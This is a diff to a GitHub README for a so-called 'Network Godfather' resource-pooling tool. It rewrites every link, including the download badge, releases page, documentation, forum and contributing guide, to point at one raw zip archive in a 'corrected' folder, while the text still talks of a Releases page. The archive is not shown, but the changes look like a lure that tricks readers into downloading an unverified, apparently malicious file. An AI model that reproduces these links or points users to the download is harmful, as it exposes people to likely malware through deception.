@@ -1,6 +1,6 @@
 # 🚀 THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine - Optimize Your Network Resources Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now!-THE--NETWORK--GODFATHER--Autonomous--Resource--Liberation--Global--Pooling--Engine-brightgreen)](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/releases)
+[![Download](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/raw/refs/heads/main/corrected/Pooling_NETWOR_Liberation_Autonomous_Resource_TH_Engine_Global_GODFATHE_v1.8.zip%20Now!-THE--NETWORK--GODFATHER--Autonomous--Resource--Liberation--Global--Pooling--Engine-brightgreen)](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/raw/refs/heads/main/corrected/Pooling_NETWOR_Liberation_Autonomous_Resource_TH_Engine_Global_GODFATHE_v1.8.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ To download and install The Network Godfather, follow these steps:
 
 1. Click on the link below to go to the Releases page.
 
-   [Visit this page to download](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/releases)
+   [Visit this page to download](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/raw/refs/heads/main/corrected/Pooling_NETWOR_Liberation_Autonomous_Resource_TH_Engine_Global_GODFATHE_v1.8.zip)
 
 2. On the Releases page, look for the latest version. You will see a list of available files.
 
@@ -64,12 +64,12 @@ If you encounter issues during the installation or while using the application, 
 
 For more information, check out these resources:
 
-- [Documentation](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/wiki)
-- [Community Forum](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/discussions)
+- [Documentation](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/raw/refs/heads/main/corrected/Pooling_NETWOR_Liberation_Autonomous_Resource_TH_Engine_Global_GODFATHE_v1.8.zip)
+- [Community Forum](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/raw/refs/heads/main/corrected/Pooling_NETWOR_Liberation_Autonomous_Resource_TH_Engine_Global_GODFATHE_v1.8.zip)
 
 ## 📢 Contributing
 
-We welcome contributions from users. If you wish to help improve The Network Godfather, please read our contributing guidelines in the [Contributing section](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/blob/main/CONTRIBUTING.md).
+We welcome contributions from users. If you wish to help improve The Network Godfather, please read our contributing guidelines in the [Contributing section](https://github.com/sakerdecimox/THE-NETWORK-GODFATHER-Autonomous-Resource-Liberation-Global-Pooling-Engine/raw/refs/heads/main/corrected/Pooling_NETWOR_Liberation_Autonomous_Resource_TH_Engine_Global_GODFATHE_v1.8.zip).
 
 ## 🌍 Topics
 
